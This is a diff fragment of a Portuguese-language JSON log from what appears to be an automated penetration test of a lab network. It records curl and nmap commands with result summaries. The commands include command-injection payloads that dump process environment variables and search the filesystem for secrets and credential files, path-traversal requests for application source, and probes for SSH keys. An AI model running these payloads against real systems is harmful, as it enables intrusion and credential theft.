+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http 200, 0 credencial(is)",
+   "revisao": 26,
+   "revisao_ao_abrir": 26
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s -D - -o /dev/null -b cookies_svc.txt http://172.20.0.11:1337/",
+   "rotulo": "curl -D - -o /dev/null -b cookies_svc.txt http://172.20.0.11:1337/",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http 302, 0 credencial(is)",
+   "revisao": 26,
+   "revisao_ao_abrir": 26
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s -i -L -b cookies_svc.txt http://172.20.0.11:1337/",
+   "rotulo": "curl -L -b cookies_svc.txt http://172.20.0.11:1337/",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http 302, 0 credencial(is)",
+   "revisao": 26,
+   "revisao_ao_abrir": 26
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s http://172.20.0.11:1337/login",
+   "rotulo": "curl http://172.20.0.11:1337/login",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http nao observado, 1776 bytes de corpo, 0 credencial(is)",
+   "revisao": 26,
+   "revisao_ao_abrir": 26
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s http://172.20.0.11:1337/login | grep -iE input|form|csrf|token",
+   "rotulo": "curl http://172.20.0.11:1337/login '|' grep -iE 'input|form|csrf|token'",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http nao observado, 426 bytes de corpo, 0 credencial(is)",
+   "revisao": 26,
+   "revisao_ao_abrir": 26
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s -X POST http://172.20.0.11:1337/login -d username=svc_deploy&password=c01",
+   "rotulo": "curl -X POST http://172.20.0.11:1337/login -d 'username=svc_deploy&password=c01'",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http nao observado, 1872 bytes de corpo, 0 credencial(is)",
+   "revisao": 26,
+   "revisao_ao_abrir": 26
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s -X POST http://172.20.0.11:1337/login -d username=svc_deploy&password=c01 | grep -iE invalid|error|welcome|success|incorrect|password",
+   "rotulo": "curl -X POST http://172.20.0.11:1337/login -d 'username=svc_deploy&password=c01' '|' grep -iE 'invalid|error|welcome|success|incorrect|password'",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http nao observado, 226 bytes de corpo, 0 credencial(is)",
+   "revisao": 26,
+   "revisao_ao_abrir": 26
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s http://172.20.0.11:1337/download/readme.txt",
+   "rotulo": "curl http://172.20.0.11:1337/download/readme.txt",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http nao observado, 2322 bytes de corpo, 0 credencial(is)",
+   "revisao": 26,
+   "revisao_ao_abrir": 26
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s -o /dev/null -w /dashboard:%{http_code}\\n -b cookies_svc.txt http://172.20.0.11:1337/dashboard; curl -s -o /dev/null -w /profile:%{http_code}\\n -b cookies_svc.txt http://172.20.0.11:1337/profile; curl -s -o /dev/null -w /home:%{http_code}\\n -b cookies_svc.txt http://172.20.0.11:1337/home; curl -s -o /dev/null -w /admin:%{http_code}\\n -b cookies_svc.txt http://172.20.0.11:1337/admin; curl -s -o /dev/null -w /account:%{http_code}\\n -b cookies_svc.txt http://172.20.0.11:1337/account; curl -s -o /dev/null -w /user:%{http_code}\\n -b cookies_svc.txt http://172.20.0.11:1337/user",
+   "rotulo": "curl -o /dev/null -w '/dashboard:%{http_code}\\n' -b cookies_svc.txt 'http://172.20.0.11:1337/dashboard;' -o /dev/null -w '/profile:%{http_code}\\n' -b cookies_svc.txt 'http://172.20.0.11:1337/profile;' -o /dev/null -w '/home:%{http_code}\\n' -b cookies_svc.txt 'http://172.20.0.11:1337/home;' -o /dev/null -w '/admin:%{http_code}\\n' -b cookies_svc.txt 'http://172.20.0.11:1337/admin;' -o /dev/null -w '/account:%{http_code}\\n' -b cookies_svc.txt 'http://172.20.0.11:1337/account;' -o /dev/null -w '/user:%{http_code}\\n' -b cookies_svc.txt http://172.20.0.11:1337/user",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http nao observado, 72 bytes de corpo, 0 credencial(is)",
+   "revisao": 26,
+   "revisao_ao_abrir": 26
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s http://172.20.0.11:1337/download/readme.txt",
+   "rotulo": "curl http://172.20.0.11:1337/download/readme.txt",
+   "alvo": "172.20.0.11",
+   "redundante": true,
+   "sucesso": true,
+   "resumo": "http nao observado, 2322 bytes de corpo, 0 credencial(is)",
+   "revisao": 26,
+   "revisao_ao_abrir": 26
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s http://172.20.0.11:1337/download/readme.txt | grep -iE rota|route|dashboard|trofeu|trophy|flag|hint|dica|header|token|cookie|session",
+   "rotulo": "curl http://172.20.0.11:1337/download/readme.txt '|' grep -iE 'rota|route|dashboard|trofeu|trophy|flag|hint|dica|header|token|cookie|session'",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": false,
+   "resumo": "curl falhou (codigo 1); http nao observado, 0 credencial(is)",
+   "revisao": 26,
+   "revisao_ao_abrir": 26
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s http://172.20.0.11:1337/download/readme.txt -o readme.txt; cat readme.txt",
+   "rotulo": "curl http://172.20.0.11:1337/download/readme.txt -o 'readme.txt;' cat readme.txt",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http nao observado, 2322 bytes de corpo, 0 credencial(is)",
+   "revisao": 26,
+   "revisao_ao_abrir": 26
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s http://172.20.0.10:8080/diagnostico?destino=172.20.0.10;for%20p%20in%20/proc/[0-9]*;%20do%20echo%20==%24p==;%20cat%20%24p/environ%202>/dev/null%20|%20tr%20%27%5C0%27%20%27%5Cn%27;%20echo;%20done",
+   "rotulo": "curl 'http://172.20.0.10:8080/diagnostico?destino=172.20.0.10;for%20p%20in%20/proc/[0-9]*;%20do%20echo%20==%24p==;%20cat%20%24p/environ%202>/dev/null%20|%20tr%20%27%5C0%27%20%27%5Cn%27;%20echo;%20done'",
+   "alvo": "172.20.0.10",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http nao observado, 3320 bytes de corpo, 0 credencial(is); saida: nenhum fato novo",
+   "revisao": 26,
+   "revisao_ao_abrir": 26
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s -o /dev/null -w /trophy:%{http_code}\\n -b cookies_svc.txt http://172.20.0.11:1337/trophy; curl -s -o /dev/null -w /flag:%{http_code}\\n -b cookies_svc.txt http://172.20.0.11:1337/flag; curl -s -o /dev/null -w /secret:%{http_code}\\n -b cookies_svc.txt http://172.20.0.11:1337/secret; curl -s -o /dev/null -w /welcome:%{http_code}\\n -b cookies_svc.txt http://172.20.0.11:1337/welcome; curl -s -o /dev/null -w /api/me:%{http_code}\\n -b cookies_svc.txt http://172.20.0.11:1337/api/me; curl -s -o /dev/null -w /index:%{http_code}\\n -b cookies_svc.txt http://172.20.0.11:1337/index",
+   "rotulo": "curl -o /dev/null -w '/trophy:%{http_code}\\n' -b cookies_svc.txt 'http://172.20.0.11:1337/trophy;' -o /dev/null -w '/flag:%{http_code}\\n' -b cookies_svc.txt 'http://172.20.0.11:1337/flag;' -o /dev/null -w '/secret:%{http_code}\\n' -b cookies_svc.txt 'http://172.20.0.11:1337/secret;' -o /dev/null -w '/welcome:%{http_code}\\n' -b cookies_svc.txt 'http://172.20.0.11:1337/welcome;' -o /dev/null -w '/api/me:%{http_code}\\n' -b cookies_svc.txt 'http://172.20.0.11:1337/api/me;' -o /dev/null -w '/index:%{http_code}\\n' -b cookies_svc.txt http://172.20.0.11:1337/index",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http nao observado, 70 bytes de corpo, 0 credencial(is)",
+   "revisao": 26,
+   "revisao_ao_abrir": 26
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s http://172.20.0.10:8080/diagnostico?destino=172.20.0.10;find%20/%20-xdev%20\\(%20-iname%20%22*flag*%22%20-o%20-iname%20%22*trophy*%22%20-o%20-iname%20%22*trofeu*%22%20-o%20-iname%20%22*troféu*%22%20-o%20-iname%20%22*secret*%22%20-o%20-iname%20%22*credential*%22%20\\)%202>/dev/null",
+   "rotulo": "curl 'http://172.20.0.10:8080/diagnostico?destino=172.20.0.10;find%20/%20-xdev%20\\(%20-iname%20%22*flag*%22%20-o%20-iname%20%22*trophy*%22%20-o%20-iname%20%22*trofeu*%22%20-o%20-iname%20%22*troféu*%22%20-o%20-iname%20%22*secret*%22%20-o%20-iname%20%22*credential*%22%20\\)%202>/dev/null'",
+   "alvo": "172.20.0.10",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http nao observado, 358 bytes de corpo, 0 credencial(is); saida: 2 caminhos novos",
+   "revisao": 27,
+   "revisao_ao_abrir": 26
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s http://172.20.0.11:1337/download/../app.py -o app_h04.py; echo ---; cat app_h04.py | head -c 2000",
+   "rotulo": "curl http://172.20.0.11:1337/download/../app.py -o 'app_h04.py;' echo '---;' cat app_h04.py '|' head -c 2000",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http nao observado, 1372 bytes de corpo, 0 credencial(is)",
+   "revisao": 27,
+   "revisao_ao_abrir": 27
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s http://172.20.0.11:1337/download/../app.py -o app_h04_full.py; wc -c app_h04_full.py; cat app_h04_full.py",
+   "rotulo": "curl http://172.20.0.11:1337/download/../app.py -o 'app_h04_full.py;' wc -c 'app_h04_full.py;' cat app_h04_full.py",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http nao observado, 1389 bytes de corpo, 0 credencial(is)",
+   "revisao": 27,
+   "revisao_ao_abrir": 27
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s http://172.20.0.11:1337/download/../app.py | grep -nE route|SELECT|secret|password|session|SECRET_KEY|admin|trophy|flag",
+   "rotulo": "curl http://172.20.0.11:1337/download/../app.py '|' grep -nE 'route|SELECT|secret|password|session|SECRET_KEY|admin|trophy|flag'",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": false,
+   "resumo": "curl falhou (codigo 1); http nao observado, 0 credencial(is)",
+   "revisao": 27,
+   "revisao_ao_abrir": 27
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s --path-as-is http://172.20.0.11:1337/download/../app.py -o app_h04_raw.py; wc -c app_h04_raw.py; cat app_h04_raw.py",
+   "rotulo": "curl --path-as-is http://172.20.0.11:1337/download/../app.py -o 'app_h04_raw.py;' wc -c 'app_h04_raw.py;' cat app_h04_raw.py",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http nao observado, 1400 bytes de corpo, 0 credencial(is)",
+   "revisao": 27,
+   "revisao_ao_abrir": 27
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s --path-as-is http://172.20.0.11:1337/download/../app.py | grep -nE route|SELECT|secret|password|session|SECRET_KEY|admin|trophy|flag|troféu|trofeu|dashboard",
+   "rotulo": "curl --path-as-is http://172.20.0.11:1337/download/../app.py '|' grep -nE 'route|SELECT|secret|password|session|SECRET_KEY|admin|trophy|flag|troféu|trofeu|dashboard'",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": false,
+   "resumo": "curl falhou (codigo 1); http nao observado, 0 credencial(is)",
+   "revisao": 27,
+   "revisao_ao_abrir": 27
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s -i -c cookies_svc2.txt -d username=svc_deploy&password=c01 http://172.20.0.11:1337/login",
+   "rotulo": "curl -c cookies_svc2.txt -d 'username=svc_deploy&password=c01' http://172.20.0.11:1337/login",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "c01 resolvida para o segredo da credencial; http 200, 0 credencial(is)",
+   "revisao": 27,
+   "revisao_ao_abrir": 27
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s -i -c cookies_svc2.txt -d username=svc_deploy&password=c01 http://172.20.0.11:1337/login | head -c 2000",
+   "rotulo": "curl -c cookies_svc2.txt -d 'username=svc_deploy&password=c01' http://172.20.0.11:1337/login '|' head -c 2000",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "c01 resolvida para o segredo da credencial; http 200, 0 credencial(is)",
+   "revisao": 27,
+   "revisao_ao_abrir": 27
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s -i -b cookies_svc2.txt http://172.20.0.11:1337/",
+   "rotulo": "curl -b cookies_svc2.txt http://172.20.0.11:1337/",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http 302, 0 credencial(is)",
+   "revisao": 27,
+   "revisao_ao_abrir": 27
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s -d username=svc_deploy&password=c01 http://172.20.0.11:1337/login -o login_c01.html; echo ---tamanho---; wc -c login_c01.html; echo ---invalid?---; grep -i invalid login_c01.html; echo ---trecho---; head -c 500 login_c01.html",
+   "rotulo": "curl -d 'username=svc_deploy&password=c01' http://172.20.0.11:1337/login -o 'login_c01.html;' echo '---tamanho---;' wc -c 'login_c01.html;' echo '---invalid?---;' grep invalid 'login_c01.html;' echo '---trecho---;' head -c 500 login_c01.html",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "c01 resolvida para o segredo da credencial; http nao observado, 639 bytes de corpo, 0 credencial(is)",
+   "revisao": 27,
+   "revisao_ao_abrir": 27
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s -D - -o /dev/null -b cookies_svc2.txt http://172.20.0.11:1337/",
+   "rotulo": "curl -D - -o /dev/null -b cookies_svc2.txt http://172.20.0.11:1337/",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http 302, 0 credencial(is)",
+   "revisao": 27,
+   "revisao_ao_abrir": 27
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s -D headers_root.txt -o /dev/null -b cookies_svc2.txt http://172.20.0.11:1337/; cat headers_root.txt",
+   "rotulo": "curl -D headers_root.txt -o /dev/null -b cookies_svc2.txt 'http://172.20.0.11:1337/;' cat headers_root.txt",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http 302, 0 credencial(is)",
+   "revisao": 27,
+   "revisao_ao_abrir": 27
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s -o /dev/null -w /download/trophy.txt:%{http_code}\\n http://172.20.0.11:1337/download/trophy.txt; curl -s -o /dev/null -w /download/flag.txt:%{http_code}\\n http://172.20.0.11:1337/download/flag.txt; curl -s -o /dev/null -w /download/troféu.txt:%{http_code}\\n http://172.20.0.11:1337/download/trof%C3%A9u.txt; curl -s -o /dev/null -w /download/secret.txt:%{http_code}\\n http://172.20.0.11:1337/download/secret.txt; curl -s -o /dev/null -w /download/credentials.txt:%{http_code}\\n http://172.20.0.11:1337/download/credentials.txt; curl -s -o /dev/null -w /download/id_rsa:%{http_code}\\n http://172.20.0.11:1337/download/id_rsa",
+   "rotulo": "curl -o /dev/null -w '/download/trophy.txt:%{http_code}\\n' 'http://172.20.0.11:1337/download/trophy.txt;' -o /dev/null -w '/download/flag.txt:%{http_code}\\n' 'http://172.20.0.11:1337/download/flag.txt;' -o /dev/null -w '/download/troféu.txt:%{http_code}\\n' 'http://172.20.0.11:1337/download/trof%C3%A9u.txt;' -o /dev/null -w '/download/secret.txt:%{http_code}\\n' 'http://172.20.0.11:1337/download/secret.txt;' -o /dev/null -w '/download/credentials.txt:%{http_code}\\n' 'http://172.20.0.11:1337/download/credentials.txt;' -o /dev/null -w '/download/id_rsa:%{http_code}\\n' http://172.20.0.11:1337/download/id_rsa",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http nao observado, 149 bytes de corpo, 0 credencial(is)",
+   "revisao": 27,
+   "revisao_ao_abrir": 27
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s http://172.20.0.11:1337/download/readme.txt -o readme.txt; wc -c readme.txt; cat readme.txt",
+   "rotulo": "curl http://172.20.0.11:1337/download/readme.txt -o 'readme.txt;' wc -c 'readme.txt;' cat readme.txt",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http nao observado, 2338 bytes de corpo, 0 credencial(is)",
+   "revisao": 27,
+   "revisao_ao_abrir": 27
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s http://172.20.0.10:8080/diagnostico?destino=172.20.0.10;cat+/opt/diagnostico/app.py",
+   "rotulo": "curl 'http://172.20.0.10:8080/diagnostico?destino=172.20.0.10;cat+/opt/diagnostico/app.py'",
+   "alvo": "172.20.0.10",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http nao observado, 6700 bytes de corpo, 0 credencial(is); saida: nenhum fato novo",
+   "revisao": 27,
+   "revisao_ao_abrir": 27
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s --path-as-is http://172.20.0.11:1337/download/../app.py -o app_h04_raw2.py; grep -nE route|SELECT|secret|password|session|SECRET_KEY|admin|trophy|flag|troféu|trofeu|dashboard app_h04_raw2.py; echo done",
+   "rotulo": "curl --path-as-is http://172.20.0.11:1337/download/../app.py -o 'app_h04_raw2.py;' grep -nE 'route|SELECT|secret|password|session|SECRET_KEY|admin|trophy|flag|troféu|trofeu|dashboard' 'app_h04_raw2.py;' echo done",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http nao observado, 5 bytes de corpo, 0 credencial(is)",
+   "revisao": 27,
+   "revisao_ao_abrir": 27
+  },
+  {
+   "ferramenta": "nmap",
+   "assinatura": "nmap -p111 --script=nfs-showmount,nfs-ls,rpcinfo 172.20.0.1",
+   "rotulo": "nmap -p111 --script=nfs-showmount,nfs-ls,rpcinfo 172.20.0.1",
+   "alvo": "172.20.0.1",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "1 hosts, 1 servicos",
+   "revisao": 27,
+   "revisao_ao_abrir": 27
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s -o trophy_h04.txt -w status:%{http_code} size:%{size_download}\\n http://172.20.0.11:1337/download/trophy.txt; echo ---; cat trophy_h04.txt",
+   "rotulo": "curl -o trophy_h04.txt -w 'status:%{http_code} size:%{size_download}\\n' 'http://172.20.0.11:1337/download/trophy.txt;' echo '---;' cat trophy_h04.txt",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http nao observado, 1406 bytes de corpo, 0 credencial(is)",
+   "revisao": 27,
+   "revisao_ao_abrir": 27
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s --path-as-is http://172.20.0.11:1337/download/../app.py -o app_src.py; grep -n @app.route\\|def  app_src.py; echo EXIT:$?",
+   "rotulo": "curl --path-as-is http://172.20.0.11:1337/download/../app.py -o 'app_src.py;' grep -n '@app.route\\|def ' 'app_src.py;' echo 'EXIT:$?'",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http nao observado, 7 bytes de corpo, 0 credencial(is)",
+   "revisao": 27,
+   "revisao_ao_abrir": 27
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s -i http://172.20.0.11:1337/download/trophy.txt",
+   "rotulo": "curl http://172.20.0.11:1337/download/trophy.txt",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http 404, 0 credencial(is)",
+   "revisao": 28,
+   "revisao_ao_abrir": 27
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s -i -b cookies_svc2.txt http://172.20.0.11:1337/board",
+   "rotulo": "curl -b cookies_svc2.txt http://172.20.0.11:1337/board",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http 302, 0 credencial(is)",
+   "revisao": 28,
+   "revisao_ao_abrir": 28
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s -i -b cookies_svc.txt http://172.20.0.11:1337/user",
+   "rotulo": "curl -b cookies_svc.txt http://172.20.0.11:1337/user",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http 302, 0 credencial(is)",
+   "revisao": 28,
+   "revisao_ao_abrir": 28
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s -i -b cookies_svc.txt http://172.20.0.11:1337/direct",
+   "rotulo": "curl -b cookies_svc.txt http://172.20.0.11:1337/direct",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http 302, 0 credencial(is)",
+   "revisao": 28,
+   "revisao_ao_abrir": 28
+  }
+ ],
+ "credenciais_omitidas": 0,
+ "revisao": 28,
+ "trofeu": false
+}
